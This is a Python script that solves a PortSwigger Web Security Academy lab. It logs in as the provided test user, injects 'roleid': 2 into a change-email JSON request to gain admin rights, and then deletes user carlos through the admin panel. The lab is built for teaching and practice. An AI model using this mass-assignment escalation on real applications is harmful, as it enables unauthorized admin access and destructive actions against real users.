'''This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile
'''

import requests


lab_id = '0a7e0016031dc66e8137430b00f000b6' # change according to generated lab_id
s = requests.Session()


def main():
    # First we need to login as wiener:peter as provided in the instructions
    uri = f"https://{lab_id}.web-security-academy.net/login"

    # data for the post request to login
    data = { 'username' : "wiener",
            'password' : "peter",
    }
    r1 = s.post(uri, data=data)

    # When logged in, we can edit our email, but we can also edit other aspects of our profile, like our roleid
    uri = f"https://{lab_id}.web-security-academy.net/my-account/change-email"
    json = {"email": "hacker@hack.com", "roleid": 2}
    r2 = s.post(uri, json=json)
    for request in r2.history:
        print(request.text)
 
    # Delete carlos and finish the lab
    uri = f"https://{lab_id}.web-security-academy.net/admin/delete?username=carlos"
    r3 = s.get(uri)
    print('finished')


if __name__ == '__main__':
    main()